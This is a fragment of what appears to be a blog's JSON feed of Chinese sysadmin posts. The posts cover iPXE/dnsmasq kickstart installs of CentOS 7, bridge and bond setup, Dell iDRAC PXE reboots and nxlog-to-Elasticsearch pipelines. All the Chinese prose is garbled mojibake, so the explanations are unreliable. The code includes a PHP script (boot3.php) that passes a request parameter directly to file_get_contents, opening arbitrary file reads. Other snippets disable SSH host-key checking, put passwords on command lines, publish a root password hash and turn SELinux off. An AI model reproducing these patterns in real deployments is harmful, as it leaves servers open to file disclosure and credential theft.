å¯ä»¥æŠŠiPXEå½“ä½œå›ºä»¶åˆ·è¿›è®¡ç®—æœºç½‘å¡çš„ROMé‡Œæ›¿æ¢æ‰è‡ªå¸¦çš„PXEï¼Œä½†æ›´ä¸ºå¸¸è§çš„æ˜¯é€šè¿‡chainloadingçš„æ–¹å¼è¿›å…¥iPXEã€‚\næœ‰ç‚¹æ™•æ˜¯å§ï¼Œæ€»ç»“ä¸€ä¸‹ï¼ŒpxeåŒ…å«äº†gpxe/ipxe/pxelinuxï¼Œipxeæ˜¯æœ€æ–°çš„ï¼Œgpxe/ipxe/pxelinuxå¯ä»¥é€šè¿‡chainçš„æ–¹å¼é¡¶æ›¿ç½‘å¡åŸç”Ÿçš„pxeã€‚\næ¨èçš„è£…æœºæ–¹å¼ï¼š\nå®¢æˆ·æœºå¯åŠ¨ç½‘å¡è‡ªå¸¦çš„å›ºä»¶pxeï¼Œç„¶åå»æœåŠ¡å™¨æ‹‰ä¸€ä¸ªgpxe/ipxeï¼Œç„¶åå¯åŠ¨è¿™ä¸ªgpxe/ipxeï¼Œå†å»æœåŠ¡å™¨æ‹‰å…·ä½“çš„å¯åŠ¨æ–‡ä»¶ï¼Œè¿™ç§å°±æ˜¯chainæ–¹å¼äº†ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ°http/iscsi/wifiç­‰å„ç§å…ˆè¿›æ–¹å¼å¯åŠ¨äº†ã€‚\næˆ‘ä»¬ç¬¬ä¸€æ­¥å…ˆè¦å‡†å¤‡ä¸€ä¸ªgpxeçš„bootæ–‡ä»¶ã€‚\nè§£é‡Šä¸€ä¸‹ï¼Œæ–‡ä»¶åç¼€æœ‰.pxe/.kpxe/.kkpxeï¼Œè¿™æ˜¯ä¸ªé€’è¿›å…³ç³»ï¼Œ.pxeæ˜¯æœ€åŸç”Ÿçš„ç½‘å¡é©±åŠ¨ï¼Œ.kpxeåŒ…å«äº†è°ƒç”¨åŸç”Ÿç½‘å¡çš„UNDIé©±åŠ¨(æ— ç½‘å¡é©±åŠ¨ï¼‰ï¼Œ.kkpxeæ›´è¿›ä¸€æ­¥ï¼ŒåŒ…å«äº†UNDI+PXEåŸç”Ÿç½‘å¡çš„é©±åŠ¨ã€‚\nå½“ç„¶é€‰æ‹©.kpxeäº†ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡è¿™ä¸ªipxeè°ƒç”¨åŸç”Ÿç½‘å¡ä¸Šçš„é©±åŠ¨å³å¯ï¼Œå¦‚æœæ˜¯ä½ è‡ªå·±è¦çƒ§ç½‘å¡çš„bootroomç‰‡å­ï¼Œå°±å¾—é€‰æ‹©æ‰€æœ‰é©±åŠ¨äº†ã€‚\nè¿™æ ·æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª gpxe-1.0.1-undionly.kpxe çš„æ–‡ä»¶ï¼Œä¿å­˜å¤‡ç”¨ã€‚\nç„¶åæˆ‘ä»¬æ¥è®¾ç½®Dnsmasq:\n1log-dhcp 2 3dhcp-no-override 4 5enable-tftp 6tftp-root = /tftpboot 7 8dhcp-range=tftp,172.16.36.100,172.16.36.105 9 10dhcp-match=gpxe,175 11dhcp-boot=net:#gpxe,gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1 12dhcp-boot=http://172.16.8.1/ks/boot.txt æ³¨æ„ï¼šgpxe-1.0.1-undionly.kpxeæ˜¯æ”¾åœ¨/tftpboot/gpxe/ä¹‹ä¸‹çš„\nä¸Šé¢æœ‰å¾ˆå¤šç„æœºï¼Œdhcp-rangeæ˜¯éšä¾¿è®¾ä¸€ä¸ªåœ°å€æ± ï¼Œå› ä¸ºæœ€ç»ˆå®é™…æ˜¯gpxeæ¥å†³å®šåœ°å€ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡dhcpå¾—åˆ°çš„åœ°å€åè€Œä¸é‡è¦äº†ã€‚dhcp-no-overrideä¸€å®šè¦æœ‰ï¼Œå¦åˆ™gpxeæœ‰bugï¼Œæ— æ³•å¯åŠ¨ã€‚\nå…¶æ¬¡åŒ¹é…gpxeï¼Œå‡¡æ˜¯175çš„éƒ½æ˜¯gpxeï¼Œä¸ºä»€ä¹ˆè¦åŒ¹é…å‘¢ï¼Ÿçœ‹ä¸‹é¢ï¼Œæœ‰ä¸¤ä¸ªdhcp-bootå¯åŠ¨é€‰é¡¹ï¼Œ#pxeï¼Œ#è¡¨ç¤ºä¸æ˜¯ï¼Œè¿™è¡Œæ„æ€æ˜¯:ä¸æ˜¯gpxeå¯åŠ¨çš„è¯ç”¨/tftp/gpxe/gpxe-1.0.1-undionly.kpxeæ¥å¯åŠ¨ï¼Œdhcpçš„serveræ˜¯172.16.36.1ã€‚ç¬¬äºŒè¡Œå¦‚æœæ˜¯gpxeå¯åŠ¨çš„è¯ï¼Œå°±chainåˆ°[http://172.16.8.1/ks/boot.txt]å»å¯åŠ¨\nå‘µå‘µï¼Œå¦‚æœä¸è¿™ä¹ˆè®¾ç½®ï¼Œå°±ç”¨ä¸€è¡Œçš„è¯ï¼š\n1dhcp-boot=gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1 å°±ä¼šé™·å…¥æ­»å¾ªç¯ï¼Œé¦–å…ˆpxeå¯åŠ¨ï¼ŒæŠ“äº†ä¸ªgpxeï¼Œgpxeåˆå¯åŠ¨æŠ“äº†ä¸ªgpxeï¼ŒåˆæŠ“gpxeï¼Œå¾ªç¯å¾€å¤æ²¡ç©æ²¡äº†ã€‚æ‰€ä»¥å¿…é¡»æ ‡è®°gpxeï¼Œå¹¶è·³å‡ºè¿™ä¸ªå¾ªç¯ã€‚\næˆ‘ä»¬åœ¨172.16.8.1ä¸Šé¢å»ºç«‹/centos7çš„yumå®‰è£…æºï¼ŒåŒæ—¶å»ºç«‹/ksç›®å½•ã€‚å‡†å¤‡boot.txtï¼Œboot2.phpï¼Œboot3.phpï¼Œcentos7.kså››ä¸ªæ–‡ä»¶ï¼Œä¸‹é¢ä¸€ä¸ªä¸€ä¸ªè§£é‡Šï¼š\né¦–å…ˆæ˜¯boot.txt\n1cat boot.txt 2#!gpxe 3 4chain http://172.16.8.1/ks/boot2.php?uuid=\\${uuid}\u0026amp;mac=\\${mac}\u0026amp;busid=\\${busid}\u0026amp;ip=\\${ip}\u0026amp;hostname=\\${hostname:uristring}\u0026amp;serial=\\${serial:uristring}\u0026amp;asset=\\${asset:uristring}\u0026amp;manufacturer=\\${manufacturer:uristring}\u0026amp;product=\\${product:uristring} å¤§å®¶çœ‹ä¸Šé¢ï¼Œboot.txtæ˜¯ä¸ªgpxeè„šæœ¬ï¼Œå®é™…æ˜¯è®©gpxeå‘boot2.phpä¼ è¾“äº†ä¸€äº›æ•°æ®è¿‡æ¥ï¼Œæœ‰æœºå™¨çš„uuid/mac/busid/hostname/serial/productç­‰ç­‰ã€‚ç»™ä¸ªå…·ä½“çš„ä¾‹å­ï¼Œä»access.logçœ‹åˆ°å®é™…å‘è¿‡æ¥çš„è¯·æ±‚å¦‚ä¸‹ï¼š\n1\u0026#34;GET /ks/boot2.php?uuid=%5C44454c4c-5600-1054-8042-b1c04f433532\u0026amp;mac=%5Cec%3Af4%3Abb%3Ad9%3A96%3A40\u0026amp;busid=%5C01%3A80%3A86%3A15%3A21\u0026amp;ip=%5C172.16.36.100\u0026amp;hostname=%5C\u0026amp;serial=%5C1VTBC52\u0026amp;asset=%5C\u0026amp;manufacturer=%5CDell%20Inc.\u0026amp;product=%5CPowerEdge%20R730 HTTP/1.0\u0026#34; 200 46 \u0026#34;-\u0026#34; \u0026#34;gPXE/1.0.1\u0026#34; \u0026#34;-\u0026#34; çœ‹ä¸Šé¢ï¼Œæœ‰å¾ˆå¤šä¿¡æ¯ï¼Œç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œè¿˜æœ‰serialï¼Œå¯¹åº”dellå°±æ˜¯svc tagå·ï¼Œè¿˜æœ‰æœºå™¨ç±»åˆ«PowerEdge R730ï¼Œè¿™æ˜¯ä¸ªå¥½ä¸œè¥¿å•Šã€‚\næˆ‘ä»¬è´­ä¹°æœºå™¨çš„æ—¶å€™è‚¯å®šæœ‰åºåˆ—å·ï¼Œä¸Šæ¶åˆ°æœºæˆ¿çš„æ—¶å€™ï¼Œå¯ä»¥è®©idcæŠ„ä¸‹æ¥æœºæŸœå’Œåºåˆ—å·ï¼Œç„¶åæˆ‘ä»¬è®©ç½‘ç®¡è§„åˆ’å¥½ipï¼Œå†è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨serialæ¥ç¡®å®šæœºå™¨åº”è¯¥æŒ‰å“ªä¸ªæ¨¡æ¿å®‰è£…ã€‚\nå†çœ‹æ¨¡æ¿æ–‡ä»¶ï¼Œcentos7.ks\n1#version=DEVEL 2auth --enableshadow --passalgo=sha512 3url --url=http://172.16.8.1/centos7 4text 5firstboot --enable 6ignoredisk --only-use=sda 7keyboard --vckeymap=us --xlayouts=\u0026#39;us\u0026#39; 8lang en_US.UTF-8 9selinux --disabled 10 11services --enabled=\u0026#34;chronyd\u0026#34; 12 13network --bootproto=static --device=em1 --noipv6 --nodns --onboot=yes --gateway={gateway} --ip={ip} --nameserver=172.16.8.1 --netmask={netmask} 14network --bootproto=dhcp --device=em2 --noipv6 --nodns --onboot=no 15network --bootproto=dhcp --device=em3 --noipv6 --nodns --onboot=no 16network --bootproto=dhcp --device=em4 --noipv6 --nodns --onboot=no 17network --hostname={hostname} 18 19#grub-crypt --sha-512 20rootpw --iscrypted $6$0Y.SH935/jvt0X.D$lCte9H/KiFeGbTGrrcuXGZXmnq3Rk4Crz8nAvCgH.Pf2SNmoUdh.g5WGWJqtVO4QTyqvnXc/6FyVjptWIaM4w1 21timezone Asia/Shanghai --isUtc 22 23bootloader --append=\u0026#34; crashkernel=auto\u0026#34; --location=mbr --boot-drive=sda 24clearpart --all --drives=sda 25 26part /boot --fstype ext4 --size=500 --ondisk=/dev/sda 27part swap --size=8192 --ondisk=/dev/sda 28part / --fstype ext4 --size=1024 --grow --ondisk=/dev/sda 29 30%packages 31@compat-libraries 32@core 33wget 34net-tools 35chrony 36bridge-utils 37%end 38 39%post 40yum -y erase NetworkManager 41cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/sysconfig/network-scripts/ifcfg-br0 42DEVICE=br0 43TYPE=Bridge 44BOOTPROTO=static 45ONBOOT=yes 46IPADDR={ip} 47NETMASK={netmask} 48GATEWAY={gateway} 49EOF 50cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/modprobe.d/bonding.conf 51alias bond0 bonding 52BONDING_OPTS=\u0026#34;miimon=100 mode=1 primary=em1\u0026#34; 53EOF 54cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-bond0 55DEVICE=bond0 56ONBOOT=yes 57USERCTL=no 58BRIDGE=br0 59EOF 60cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-em1 61DEVICE=em1 62USERCTL=no 63ONBOOT=yes 64MASTER=bond0 65SLAVE=yes 66BRIDGE=\u0026#34;br0\u0026#34; 67EOF 68cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-em2 69DEVICE=em2 70USERCTL=no 71ONBOOT=yes 72MASTER=bond0 73SLAVE=yes 74BRIDGE=\u0026#34;br0\u0026#34; 75EOF 76%end 77 78reboot æ³¨æ„ä¸Šé¢ï¼Œ{ip}ã€{netmask}ã€{gateway}ã€{hostname}æ˜¯å¾…å®šçš„ã€‚\nç„¶åçœ‹çœ‹boot2.php:\n1\u0026lt;?php 2$dns=\u0026#39;172.16.8.1\u0026#39;; 3$base7=\u0026#39;http://172.16.8.1/centos7\u0026#39;; 4$ks7=\u0026#39;http://172.16.8.1/ks/boot3.php\u0026#39;; 5 6echo \u0026#34;#!gpxe\\n\u0026#34;; 7 8 9switch ($_REQUEST[\u0026#39;mac\u0026#39;]) { 10 11 case \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: 12 $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; 13 $ipa=explode(\u0026#39;:\u0026#39;,$ip); 14 echo \u0026#34;ifopen net0\\n\u0026#34;; 15 echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; 16 echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; 17 echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; 18 echo \u0026#34;set net0/dns $dns\\n\u0026#34;; 19 echo \u0026#34;set base-url $base7\\n\u0026#34;; 20 echo \u0026#34;kernel \\${base-url}/images/pxeboot/vmlinuz\\n\u0026#34;; 21 echo \u0026#34;imgargs vmlinuz inst.ks=$ks7?file=centos7.ks\u0026amp;ip=$ipa[0]\u0026amp;mask=$ipa[2]\u0026amp;gateway=$ipa[1]\u0026amp;hostname=$ipa[3] ksdevice=bootif inst.vnc inst.vncpassword=xxxxxxxx inst.sshd\\n\u0026#34;; 22 echo \u0026#34;initrd \\${base-url}/images/pxeboot/initrd.img\\n\u0026#34;; 23 echo \u0026#34;boot\\n\u0026#34;; 24 break; 25 26 case \u0026#39;00:11:22:33:44:55\u0026#39;: 27 # boot from iSCSI 28 echo \u0026#34;set initiator-iqn iqn.2007-08.com.example.initiator:initiator\\n\u0026#34;; 29 # see http://ipxe.org/sanuri for the syntax 30 echo \u0026#34;sanboot iscsi:san.example.com:6:3260:0:iqn.2007-08.com.example.san:sometarget\\n\u0026#34;; 31 break; 32 33 case \u0026#39;\\00:77:21ğŸ†cd:ee\u0026#39;: 34 # boot boot.salstar.sk\u0026#39;s super cool boot menu 35 echo \u0026#34;chain http://boot.salstar.sk\\n\u0026#34;; 36 break; 37 38 default: 39 # exit iPXE and let machine go on with BIOS boot sequence 40 echo \u0026#34;exit\\n\u0026#34;; 41 break; 42} 43 44?\u0026gt; æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡ç½‘å¡çš„ç‰©ç†åœ°å€æ¥åˆ¤æ–­æ¨¡æ¿çš„ï¼Œç”¨svc tagå·æ›´å¥½ã€‚\nç¬¬å››ä¸ªæ–‡ä»¶ï¼šboot3.php\n1\u0026lt;?php 2 3$origin_str = file_get_contents($_REQUEST[\u0026#39;file\u0026#39;]); 4 5$update_str = str_replace(\u0026#34;{ip}\u0026#34;, $_REQUEST[\u0026#39;ip\u0026#39;], $origin_str); 6$update_str = str_replace(\u0026#39;{netmask}\u0026#39;, $_REQUEST[\u0026#39;mask\u0026#39;], $update_str); 7$update_str = str_replace(\u0026#39;{gateway}\u0026#39;, $_REQUEST[\u0026#39;gateway\u0026#39;], $update_str); 8$update_str = str_replace(\u0026#39;{hostname}\u0026#39;, $_REQUEST[\u0026#39;hostname\u0026#39;], $update_str); 9 10echo $update_str; 11?\u0026gt; boot3.phpçš„åŠŸèƒ½å°±æ˜¯æ›¿æ¢æ‰æ¨¡æ¿æ–‡ä»¶é‡Œçš„ipç­‰ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ­£ç¡®çš„ksæ–‡ä»¶ã€‚\nè¿™ä¸‹å°±å®Œç¾äº†ï¼Œæˆ‘ä»¬åŸºæœ¬å°±éœ€è¦ä¿®æ”¹ksä¸‹çš„boot2.phpå’Œcentos7.ksï¼Œå°±å¯ä»¥æ§åˆ¶è¿œç¨‹å®‰è£…äº†ã€‚\ndhcpå’Œtftpï¼Œå°±ç”¨dnsmasqå’Œé‚£ä¸€ä¸ªgxpeå°±å¤Ÿäº†ï¼Œçœäº†å¤§äº‹äº†ã€‚\nè¿˜æœ‰æ›´å¥½ç©çš„: ç½‘å¡åŸç”Ÿpxe\u0026ndash;\u0026gt;gpxe\u0026ndash;\u0026gt;pxelinux.0\nå¤§å®¶å°½æƒ…æƒ³è±¡å§ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_install/","series":null,"tags":null,"title":"IPXE Kickstartå®‰è£…CentOSçš„æ–¹æ³•"},{"categories":null,"content":"å¦‚ä½•åœ¨kickstartè„šæœ¬ä¸­æ—¢é…ç½®brï¼Œåˆé…ç½®bondingå‘¢ï¼Ÿ\nåŸºæœ¬ç¯‡ï¼š ä»¥Dell R730ä¸ºä¾‹ï¼Œç‰©ç†ç½‘å¡åç§°æ˜¯em1/em2/em3/em4\n1network --device=br0 --noipv6 --onboot=yes --bridgeslaves=bond0 --gateway=172.16.37.254 --ip=172.16.36.2 --nameserver=172.16.8.1 --netmask=255.255.254.0 --activate 2network --device=bond0 --noipv6 --onboot=yes --bondslaves=em1,em2 --bondopts=mode=active-backup,balance-rr;primary=em1,miimon=80,updelay=60000 --activate 3network --device=em1 --noipv6 --nodns --onboot=yes --activate 4network --device=em2 --noipv6 --nodns --onboot=yes --activate 5network --device=em3 --noipv6 --nodns --onboot=yes --activate 6network --device=em4 --noipv6 --nodns --onboot=yes --activate 7network --hostname=myhost-16-36-2 æ³¨æ„ä»¥ä¸Šï¼Œæ˜¯åªåšäº† em1 å’Œ em2 ç»‘å®šæˆä¸º bond0 ï¼Œç„¶å br0 å¯åŠ¨åœ¨ bond0 ä¹‹ä¸Šã€‚\nè¿›é˜¶ç¯‡ï¼š åŸºæœ¬ç¯‡çš„åšæ³•å›ºç„¶æ˜¯åšäº†å››ç½‘å¡ç»‘å®šå’Œæ¡¥æ¥ï¼Œå‰¯ä½œç”¨ä¹Ÿæ˜¯å¾ˆå¯æ€•çš„ã€‚\nå¤§å®¶å»çœ‹/etc/sysconfig/network-scriptsï¼Œ é‡Œé¢æœ‰ä¸€å †çš„ifcfg-br0-slave_1ï¼Œifcfg-bond0-slave_1ï¼Œ ifcfg-bond0-slave_2ï¼Œæ›´å¯æ¶çš„æ˜¯è¿›ç¨‹ä¸­è·‘ç€å¥½å‡ ä¸ªdhcp-clientï¼Œä¸€æƒ³å°±æ˜ç™½äº†ï¼Œè¿™æ˜¯NetworkManageræå¾—ã€‚em3å’Œem4ä¸æ–­å»å¯åœç«¯å£ï¼Œè¯•å›¾è·å¾—åœ°å€ï¼Œå¯¼è‡´äº¤æ¢æœºç«¯å£å¿½æ–­å¿½é€šã€‚\nè¿™ä¸ªè¯•å›¾è‡ªåŠ¨åŒ–ç½‘ç»œçš„ä¸œè¥¿åœ¨æœåŠ¡å™¨è·‘ä¸Šå®åœ¨æ˜¯å¤ªæ— èŠäº†ã€‚\næ‰€ä»¥ä¸Šé¢çš„åšæ³•æ‘’å¼ƒã€‚åœ¨%postæŠŠç½‘ç»œæå¥½ï¼š\n1... 2%packages 3@compat-libraries 4@core 5wget 6net-tools 7chrony 8bridge-utils 9%end 10... 11 12network --bootproto=static --device=em1 --noipv6 --nodns --onboot=yes --gateway=172.16.37.254 --ip=172.16.36.2 --nameserver=172.16.8.1 --netmask=255.255.254.0 13network --bootproto=dhcp --device=em2 --noipv6 --nodns --onboot=no 14network --bootproto=dhcp --device=em3 --noipv6 --nodns --onboot=no 15network --bootproto=dhcp --device=em4 --noipv6 --nodns --onboot=no 16network --hostname=myhost-16-36-2 17... 18 19%post 20 yum -y erase NetworkManager 21 cat \u0026lt;/etc/sysconfig/network-scripts/ifcfg-br0 22 DEVICE=br0 23 TYPE=Bridge 24 BOOTPROTO=static 25 ONBOOT=yes 26 IPADDR=172.16.36.2 27 NETMASK=255.255.254.0 28 GATEWAY=172.16.37.254 29 EOF 30 cat \u0026lt; /etc/modprobe.d/bonding.conf 31 alias bond0 bonding 32 BONDING_OPTS=\u0026#34;miimon=100 mode=1 primary=em1\u0026#34; 33 EOF 34 cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-bond0 35 DEVICE=bond0 36 ONBOOT=yes 37 USERCTL=no 38 BRIDGE=br0 39 EOF 40 cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em1 41 DEVICE=em1 42 USERCTL=no 43 ONBOOT=yes 44 MASTER=bond0 45 SLAVE=yes 46 BRIDGE=\u0026#34;br0\u0026#34; 47 EOF 48 cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em2 49 DEVICE=em2 50 USERCTL=no 51 ONBOOT=yes 52 MASTER=bond0 53 SLAVE=yes 54 BRIDGE=\u0026#34;br0\u0026#34; 55 EOF 56 %end æ³¨æ„ä¸Šé¢ï¼Œå®‰è£…åŒ…å¿…é¡»å®‰è£…bridge-utilsï¼Œå¦åˆ™æ²¡æœ‰brctlï¼Œæ— æ³•å¯åŠ¨br0ã€‚\nå…¶æ¬¡æ˜¯å¸è½½äº†NetworkManagerï¼ŒæœåŠ¡å™¨ç½‘ç»œéƒ½æ˜¯æ‰‹åŠ¨é…çš„ï¼Œæ²¡äººç”¨è‡ªåŠ¨åŒ–ç®¡ç†ã€‚\nè¿™æ ·å°±å®Œç¾äº†ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-kickstart_bongding/","series":null,"tags":null,"title":"Kickstartå®‰è£…è„šæœ¬ä¸­å¦‚ä½•åŒæ—¶é…ç½®bridgeå’Œbond"},{"categories":null,"content":"ç”¨Dell idracçš„è„šæœ¬æ¥ä½¿æœåŠ¡å™¨è¿›å…¥å•æ¬¡pxeå®‰è£…è¿›ç¨‹ã€‚\nè„šæœ¬å¦‚ä¸‹ï¼š\n1sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm set iDRAC.ServerBoot.BootOnce 1 2sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm set iDRAC.ServerBoot.FirstBootDevice PXE 3sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm serveraction powercycle ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-idrac_pxe/","series":null,"tags":null,"title":"Dell Idrac é‡å¯æœºå™¨è¿›å…¥å•æ¬¡pxeå®‰è£…"},{"categories":null,"content":"å…¶å®rsyslogã€syslog-ngã€nxlogè¿™ä¸‰ç§ä¸œè¥¿çœŸçš„æ˜¯éƒ½å·®ä¸å¤šã€‚éšä¾¿é€‰ä¸€ä¸ªç”¨éƒ½æ²¡é—®é¢˜ã€‚\næ¯”è¾ƒå–œæ¬¢nxlogçš„routeå’Œjsonä»¥åŠç®­å¤´çš„åŠŸèƒ½ï¼Œå¾ˆç®€æ´ï¼Œæ‰€ä»¥ç”¨å®ƒæ¥æ¨æ•°æ®åˆ°elasticsearch\næ–¹æ³•ä¸€ã€ç”¨om_elasticsearchæ¨ï¼š 1... 2\u0026lt;Input in\u0026gt; 3 Module im_tcp 4 Host 0.0.0.0 5 Port 1514 6 InputType Binary 7\u0026lt;/Input\u0026gt; 8 9\u0026lt;Output es\u0026gt; 10 Module om_elasticsearch 11 URL http://localhost:9200/_bulk 12 FlushInterval 2 13 FlushLimit 100 14 # Create an index daily 15 Index strftime($EventTime, \u0026#34;nxlog-%Y%m%d\u0026#34;) 16 IndexType \u0026#34;My logs\u0026#34; 17 18 # Use the following if you don\u0026#39;t have $EventTime set 19 #Index strftime(now(),\u0026#34;nxlog-%Y%m%d\u0026#34;) 20\u0026lt;/Output\u0026gt; 21 22\u0026lt;Route r\u0026gt; 23 Path in =\u0026gt; es 24\u0026lt;/Route\u0026gt; 25... æ–¹æ³•äºŒã€ç”¨om_httpæ¨ï¼š 1... 2\u0026lt;Output elasticsearch\u0026gt; 3 Module om_http 4 URL http://elasticsearch:9200 5 ContentType application/json 6 Exec set_http_request_path(strftime($EventTime, \u0026#34;/nxlog-%Y%m%d/\u0026#34; + $SourceModuleName)); rename_field(\u0026#34;timestamp\u0026#34;,\u0026#34;@timestamp\u0026#34;); to_json(); 7\u0026lt;/Output\u0026gt; 8... æˆ‘ä»¬ç”Ÿäº§ä¸Šæ˜¯å°†å„ä¸ªæœºå™¨ä¸Šçš„æ—¥å¿—é€šè¿‡rsyslogå‘åˆ°nxlogï¼Œå†ç”±nxlogå¯¼å…¥elasticsearchï¼Œç„¶åç”¨kinabaçœ‹ã€‚\njsonåŒ–çš„F5æ—¥å¿—å¦‚ä¸‹ï¼š\n1 { 2 \u0026#34;MessageSourceAddress\u0026#34;:\u0026#34;172.1.2.2\u0026#34;, 3 \u0026#34;EventReceivedTime\u0026#34;:\u0026#34;2016-01-02 14:04:07\u0026#34;, 4 \u0026#34;SourceModuleName\u0026#34;:\u0026#34;in_udp\u0026#34;, 5 \u0026#34;SourceModuleType\u0026#34;:\u0026#34;im_udp\u0026#34;, 6 \u0026#34;SyslogFacilityValue\u0026#34;:22, 7 \u0026#34;SyslogFacility\u0026#34;:\u0026#34;LOCAL6\u0026#34;, 8 \u0026#34;SyslogSeverityValue\u0026#34;:6, 9 \u0026#34;SyslogSeverity\u0026#34;:\u0026#34;INFO\u0026#34;, 10 \u0026#34;SeverityValue\u0026#34;:2, 11 \u0026#34;Severity\u0026#34;:\u0026#34;INFO\u0026#34;, 12 \u0026#34;Hostname\u0026#34;:\u0026#34;www\u0026#34;, 13 \u0026#34;EventTime\u0026#34;:\u0026#34;2016-01-02 14:04:07\u0026#34;, 14 \u0026#34;Message\u0026#34;:\u0026#34;info logger: [ssl_req][02/Jun/2016:14:04:07 +0800] 127.0.0.1 TLSv1 AES256-SHA \\\u0026#34;/iControl/iControlPortal.cgi\\\u0026#34; 656\u0026#34; 15 } nxlogçš„é…ç½®å¦‚ä¸‹ï¼š 1... 2\u0026lt;Extension json\u0026gt; 3 Module xm_json 4\u0026lt;/Extension\u0026gt; 5 6\u0026lt;Input in_udp\u0026gt; 7 Module im_udp 8 Host 0.0.0.0 9 Port 514 10 Exec parse_syslog(); to_json(); 11\u0026lt;/Input\u0026gt; 12 13\u0026lt;Output nxlog_out\u0026gt; 14 Module om_file 15 File \u0026#34;/var/log/nxlog/nxlog.out\u0026#34; 16\u0026lt;/Output\u0026gt; 17 18\u0026lt;Processor buffer_udp\u0026gt; 19 Module pm_buffer 20 # 1Mb buffer 21 MaxSize 1024 22 Type Mem 23 # warn at 512k 24 WarnLimit 512 25\u0026lt;/Processor\u0026gt; 26... 27\u0026lt;Output elasticsearch\u0026gt; 28 Module om_http 29 URL http://localhost:9200 30 ContentType application/json 31 Exec set_http_request_path(strftime($EventTime, \u0026#34;/logstash-%Y.%m.%d/F5-Log\u0026#34;)); 32 Exec set_http_request_path(strftime($EventTime, \u0026#34;/logstash-%Y.%m.%d/F5-Log\u0026#34;)); 33 Exec delete($EventReceivedTime); 34 Exec delete($SourceModuleName); 35 Exec delete($SourceModuleType); 36 Exec delete($SyslogFacilityValue); 37 Exec delete($SyslogFacility); 38 Exec delete($SyslogSeverityValue); 39 #Exec delete($SyslogSeverity); 40 Exec delete($SeverityValue); 41 Exec delete($Severity); 42 Exec $type=\u0026#34;F5-Log\u0026#34;; 43 Exec $t=strftime($EventTime, \u0026#34;%Y-%m-%dT%H:%M:%S%z\u0026#34;); 44 Exec rename_field(\u0026#34;t\u0026#34;,\u0026#34;@timestamp\u0026#34;); 45 Exec to_json(); 46\u0026lt;/Output\u0026gt; 47 48\u0026lt;Route udp\u0026gt; 49 Path in_udp =\u0026gt; buffer_udp =\u0026gt; nxlog_out =\u0026gt; elasticsearch 50\u0026lt;/Route\u0026gt; æ³¨æ„æˆ‘ä»¬åœ¨in_udpçš„æ—¶å€™å°±å·²ç»æŠŠæ•°æ®å˜æˆäº†jsonï¼Œéšåå‘åˆ°buffer_udpï¼Œç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„ä½œç”¨æ˜¯å½“elasticsearchåäº†éœ€è¦é‡å¯çš„æ—¶å€™ï¼Œæ•°æ®ä¼šå…ˆæ”¾åˆ°bufferï¼Œå½“å¥½äº†çš„æ—¶å€™é‡å‘ã€‚\nnxlog_outæ˜¯ä¸ºäº†æŸ¥çœ‹åˆ°åº•é€è¿‡æ¥ä»€ä¹ˆå­—æ®µï¼Œæˆ‘ä»¬å¥½è°ƒè¯•ã€‚å®é™…ç”Ÿäº§ä¸­ï¼Œçœ‹åˆ°ä¸€æ¡æ•°æ®å°±å¤Ÿäº†ã€‚ç„¶åå°±å¯ä»¥åˆ é™¤è¿™ä¸ªrouteã€‚\nelasticsearchä¸­ï¼Œæˆ‘ä»¬åˆ å»äº†æ— ç”¨çš„åºŸç‰©å­—æ®µã€‚åŠ ä¸Šäº†typeå’Œ@timestampï¼Œå¦‚æœä¸åŠ , kibanaæ— æ³•åˆ¤æ–­ã€‚\næ‰€ä»¥å¦‚ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç›´é€jsonæ•°æ®åˆ°Elasticsearchï¼Œç„¶åå†grafanaæ˜¾ç¤ºå‡ºæ¥ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-nxlog_es/","series":null,"tags":null,"title":"Nxlogæ¨é€æ•°æ®åˆ°elasticsearch"},{"categories":null,"content":"F5-Bigipè´Ÿè½½å‡è¡¡è®¾å¤‡ï¼Œåœ¨æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒï¼Œç”¨äºåˆ†å‘å‰ç«¯çš„è¯·æ±‚ï¼Œå¦‚æœåç«¯çš„æˆå‘˜ç¦»çº¿äº†ï¼Œéœ€è¦åŠæ—¶å¾—åˆ°é€šçŸ¥ã€‚\nè§„åˆ™æ˜¯ï¼šload balanceæ± 